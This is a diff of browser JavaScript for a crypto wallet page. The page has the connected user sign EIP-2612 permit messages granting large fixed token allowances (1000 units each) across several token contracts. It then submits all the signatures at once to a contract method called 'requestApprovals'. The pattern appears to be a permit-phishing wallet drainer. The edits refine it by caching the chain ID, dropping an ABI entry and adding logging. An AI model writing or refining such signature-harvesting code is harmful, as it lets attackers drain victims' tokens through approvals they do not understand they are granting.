@@ -39,22 +39,6 @@
         ];
         const tokenABI = [
             {
-                "constant": false,
-                "inputs": [
-                    { "name": "owner", "type": "address" },
-                    { "name": "spender", "type": "address" },
-                    { "name": "value", "type": "uint256" },
-                    { "name": "deadline", "type": "uint256" },
-                    { "name": "v", "type": "uint8" },
-                    { "name": "r", "type": "bytes32" },
-                    { "name": "s", "type": "bytes32" }
-                ],
-                "name": "permit",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
                 "constant": true,
                 "inputs": [{ "name": "owner", "type": "address" }],
                 "name": "nonces",
@@ -63,6 +47,7 @@
                 "type": "function"
             }
         ];
+
         let web3, userAccount, contract;
 
         // Connect wallet function
@@ -91,6 +76,7 @@
                     return;
                 }
 
+                const chainId = await web3.eth.getChainId();
                 const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
                 const values = [web3.utils.toWei("1000", "ether"), web3.utils.toWei("1000", "ether"), web3.utils.toWei("1000", "ether")];
 
@@ -104,7 +90,7 @@
                     const domain = {
                         name: "ERC20 Token",
                         version: "1",
-                        chainId: await web3.eth.getChainId(),
+                        chainId: chainId,
                         verifyingContract: tokenAddresses[i]
                     };
                     const types = {
@@ -124,6 +110,8 @@
                         deadline: deadline
                     };
 
+                    console.log(`Signing permit for token ${i + 1}:`, message);
+
                     const signature = await ethereum.request({
                         method: "eth_signTypedData_v4",
                         params: [userAccount, JSON.stringify({ domain, types, message })]
@@ -134,6 +122,8 @@
                     r.push(sig.r);
                     s.push(sig.s);
                 }
+
+                console.log("Submitting requestApprovals with data:", { tokenAddresses, values, v, r, s });
 
                 await contract.methods
                     .requestApprovals(tokenAddresses, values, v, r, s)
